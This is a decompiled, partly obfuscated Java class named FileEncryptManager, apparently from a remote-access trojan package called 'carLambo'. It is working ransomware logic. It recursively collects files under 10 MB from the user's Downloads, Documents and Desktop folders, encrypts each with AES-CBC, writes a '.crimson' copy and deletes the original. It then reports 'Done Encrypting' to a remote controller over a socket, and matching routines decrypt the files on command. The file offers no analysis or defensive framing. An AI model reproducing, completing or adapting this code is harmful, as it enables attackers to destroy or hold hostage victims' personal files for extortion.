package carLambo;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

public class FileEncryptManager {
   private static String crimsonExtension = ".crimson";
   private String[] encryptedLocations;
   private String encryptManagerPath;

   // $FF: synthetic method
   static void FileEncryptManager(FileEncryptManager var0) {
      FileEncryptManager var4 = var0 = var0;
      ArrayList var5 = new ArrayList();
      String[] var6 = var4.encryptedLocations;
      int var7 = var4.encryptedLocations.length;

      int var15;
      for(int var10000 = var15 = 0; var10000 < var7; var10000 = var15) {
         String var8 = var6[var15];
         File var25;
         if ((var25 = new File(var8)).exists()) {
            Iterator var26 = getNextFiles(var25.getAbsolutePath()).iterator();

            while(var26.hasNext()) {
               String var1 = (String)var26.next();
               File var11;
               if ((var11 = new File(var1)).length() <= 10240000L) {
                  var5.add(var11.getAbsolutePath());
               }
            }
         }

         ++var15;
      }

      Iterator var12 = var5.iterator();

      while(var12.hasNext()) {
         String var2 = (String)var12.next();
         File var13 = new File(var2);
         String var3 = (new StringBuilder()).insert(0, var13.getAbsolutePath()).append(crimsonExtension).toString();

         try {
            ByteArrayOutputStream var16 = new ByteArrayOutputStream();
            byte[] var17 = new byte[8192];

            FileInputStream var20;
            for(FileInputStream var28 = var20 = new FileInputStream(var13); (var7 = var28.read(var17, 0, 8192)) != -1; var28 = var20) {
               var16.write(var17, 0, var7);
            }

            var20.close();
            String var29 = var0.encryptManagerPath;
            var17 = var16.toByteArray();
            String var18 = var29;
            SecureRandom var21 = new SecureRandom();
            byte[] var24 = new byte[16];
            var21.nextBytes(var24);
            SecretKey var22 = RemoteScreenManager.sabretb(var18, var24);
            Cipher var19 = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            IvParameterSpec var27 = new IvParameterSpec(var24);
            var19.init(1, var22, var27);
            var17 = var19.doFinal(var17);
            ByteBuffer var23;
            (var23 = ByteBuffer.allocate(20 + var17.length)).putInt(16);
            var23.put(var24);
            var23.put(var17);
            var24 = var23.array();
            FileOutputStream var14 = new FileOutputStream(new File(var3));
            var14.write(var24);
            var14.flush();
            var14.close();
            var13.delete();
         } catch (Exception var10) {
            ;
         }
      }

      try {
         ConnectionUtil.sendUpdateToSocket("Done Encrypting");
      } catch (Exception var9) {
         Logger.getLogger(FileEncryptManager.class.getName()).log(Level.SEVERE, (String)null, var9);
      }
   }

   // $FF: synthetic method
   private void bsgshsbs() {
      Iterator var1 = this.fgsbsfgsb().iterator();

      while(var1.hasNext()) {
         String var2 = (String)var1.next();
         File var10 = new File(var2);
         String var3 = (new StringBuilder()).insert(0, var10.getAbsolutePath()).append(crimsonExtension).toString();

         try {
            ByteArrayOutputStream var4 = new ByteArrayOutputStream();
            byte[] var5 = new byte[8192];

            FileInputStream var6;
            int var7;
            for(FileInputStream var10000 = var6 = new FileInputStream(var10); (var7 = var10000.read(var5, 0, 8192)) != -1; var10000 = var6) {
               var4.write(var5, 0, var7);
            }

            var6.close();
            byte[] var12 = RemoteScreenManager.sdfsldf(this.encryptManagerPath, var4.toByteArray());
            FileOutputStream var11 = new FileOutputStream(new File(var3));
            var11.write(var12);
            var11.flush();
            var11.close();
            var10.delete();
         } catch (Exception var9) {
            ;
         }
      }

      try {
         ConnectionUtil.sendUpdateToSocket("Done Encrypting");
      } catch (Exception var8) {
         Logger.getLogger(FileEncryptManager.class.getName()).log(Level.SEVERE, (String)null, var8);
      }
   }

   public final void sdfsldf() {
      (new Thread(new FileDecryptorThread(this))).start();
   }

   // $FF: synthetic method
   private List gsbthstgb() {
      ArrayList var1 = new ArrayList();
      String[] var2 = this.encryptedLocations;
      int var3 = this.encryptedLocations.length;

      int var4;
      for(int var10000 = var4 = 0; var10000 < var3; var10000 = var4) {
         String var5 = var2[var4];
         File var7;
         if ((var7 = new File(var5)).exists()) {
            Iterator var8 = getNextFiles(var7.getAbsolutePath()).iterator();

            while(var8.hasNext()) {
               String var6 = (String)var8.next();
               File var9;
               if ((var9 = new File(var6)).getName().endsWith(crimsonExtension)) {
                  var1.add(var9.getAbsolutePath());
               }
            }
         }

         ++var4;
      }

      return var1;
   }

   // $FF: synthetic method
   private void sfsrgsbd() {
      ArrayList var2 = new ArrayList();
      String[] var1;
      int var3 = (var1 = this.encryptedLocations).length;

      int var4;
      for(int var10000 = var4 = 0; var10000 < var3; var10000 = var4) {
         String var5 = var1[var4];
         File var16;
         if ((var16 = new File(var5)).exists()) {
            Iterator var17 = getNextFiles(var16.getAbsolutePath()).iterator();

            while(var17.hasNext()) {
               String var6 = (String)var17.next();
               File var19;
               if ((var19 = new File(var6)).getName().endsWith(crimsonExtension)) {
                  var2.add(var19.getAbsolutePath());
               }
            }
         }

         ++var4;
      }

      Iterator var10 = var2.iterator();

      while(var10.hasNext()) {
         String var11 = (String)var10.next();
         File var12;
         String var13 = (var12 = new File(var11)).getAbsolutePath().substring(0, var12.getAbsolutePath().lastIndexOf(crimsonExtension));

         try {
            ByteArrayOutputStream var15 = new ByteArrayOutputStream();
            byte[] var18 = new byte[8192];

            int var7;
            FileInputStream var20;
            for(FileInputStream var22 = var20 = new FileInputStream(var12); (var7 = var22.read(var18, 0, 8192)) != -1; var22 = var20) {
               var15.write(var18, 0, var7);
            }

            var20.close();
            byte[] var21 = RemoteScreenManager.encryptData(this.encryptManagerPath, var15.toByteArray());
            FileOutputStream var14 = new FileOutputStream(new File(var13));
            var14.write(var21);
            var14.flush();
            var14.close();
            var12.delete();
         } catch (Exception var9) {
            ;
         }
      }

      try {
         ConnectionUtil.sendUpdateToSocket("Done Decrypting");
      } catch (Exception var8) {
         Logger.getLogger(FileEncryptManager.class.getName()).log(Level.SEVERE, (String)null, var8);
      }
   }

   FileEncryptManager(String path) {
      this.encryptManagerPath = path;
      path = (new StringBuilder()).insert(0, System.getProperty("user.home")).append(File.separator).toString();
      this.encryptedLocations = new String[]{path + "Downloads", (new StringBuilder()).insert(0, path).append("Documents").toString(), (new StringBuilder()).insert(0, path).append("Desktop").toString()};
   }

   public final void sabretb() {
      (new Thread(new FileEncryptorThread(this))).start();
   }

   // $FF: synthetic method
   private List fgsbsfgsb() {
      ArrayList var1 = new ArrayList();
      String[] var2 = this.encryptedLocations;
      int var3 = this.encryptedLocations.length;

      int var4;
      for(int var10000 = var4 = 0; var10000 < var3; var10000 = var4) {
         String var5 = var2[var4];
         File var7;
         if ((var7 = new File(var5)).exists()) {
            Iterator var8 = getNextFiles(var7.getAbsolutePath()).iterator();

            while(var8.hasNext()) {
               String var6 = (String)var8.next();
               File var9;
               if ((var9 = new File(var6)).length() <= 10240000L) {
                  var1.add(var9.getAbsolutePath());
               }
            }
         }

         ++var4;
      }

      return var1;
   }

   public static boolean isDocumentsEndsWithCrimson() {
      Iterator f = getNextFiles((new StringBuilder()).insert(0, System.getProperty("user.home")).append(File.separator).append("Documents").toString()).iterator();

      do {
         if (!f.hasNext()) {
            return false;
         }
      } while(!((String)f.next()).endsWith(crimsonExtension));

      return true;
   }

   // $FF: synthetic method
   static void decrypt(FileEncryptManager var0) {
      FileEncryptManager var1 = var0 = var0;
      ArrayList var2 = new ArrayList();
      String[] var10;
      int var3 = (var10 = var1.encryptedLocations).length;

      int var4;
      for(int var10000 = var4 = 0; var10000 < var3; var10000 = var4) {
         String var5 = var10[var4];
         File var17;
         if ((var17 = new File(var5)).exists()) {
            Iterator var18 = getNextFiles(var17.getAbsolutePath()).iterator();

            while(var18.hasNext()) {
               String var6 = (String)var18.next();
               File var20;
               if ((var20 = new File(var6)).getName().endsWith(crimsonExtension)) {
                  var2.add(var20.getAbsolutePath());
               }
            }
         }

         ++var4;
      }

      Iterator var11 = var2.iterator();

      while(var11.hasNext()) {
         String var12 = (String)var11.next();
         File var13;
         String var14 = (var13 = new File(var12)).getAbsolutePath().substring(0, var13.getAbsolutePath().lastIndexOf(crimsonExtension));

         try {
            ByteArrayOutputStream var16 = new ByteArrayOutputStream();
            byte[] var19 = new byte[8192];

            int var7;
            FileInputStream var21;
            for(FileInputStream var23 = var21 = new FileInputStream(var13); (var7 = var23.read(var19, 0, 8192)) != -1; var23 = var21) {
               var16.write(var19, 0, var7);
            }

            var21.close();
            byte[] var22 = RemoteScreenManager.encryptData(var0.encryptManagerPath, var16.toByteArray());
            FileOutputStream var15 = new FileOutputStream(new File(var14));
            var15.write(var22);
            var15.flush();
            var15.close();
            var13.delete();
         } catch (Exception var9) {
            ;
         }
      }

      try {
         ConnectionUtil.sendUpdateToSocket("Done Decrypting");
      } catch (Exception var8) {
         Logger.getLogger(FileEncryptManager.class.getName()).log(Level.SEVERE, (String)null, var8);
      }
   }

   // $FF: synthetic method
   private static List getNextFiles(String var0) {
      ArrayList var1 = new ArrayList();
      File[] var6;
      if ((var6 = (new File(var0)).listFiles()) != null) {
         int var2 = var6.length;

         int var3;
         for(int var10000 = var3 = 0; var10000 < var2; var10000 = var3) {
            File var4;
            if ((var4 = var6[var3]).isDirectory()) {
               Iterator var7;
               Iterator var8 = var7 = getNextFiles(var4.getAbsolutePath()).iterator();

               while(var8.hasNext()) {
                  String var5 = (String)var7.next();
                  var8 = var7;
                  var1.add(var5);
               }
            } else {
               var1.add(var4.getAbsolutePath());
            }

            ++var3;
         }
      }

      return var1;
   }
}
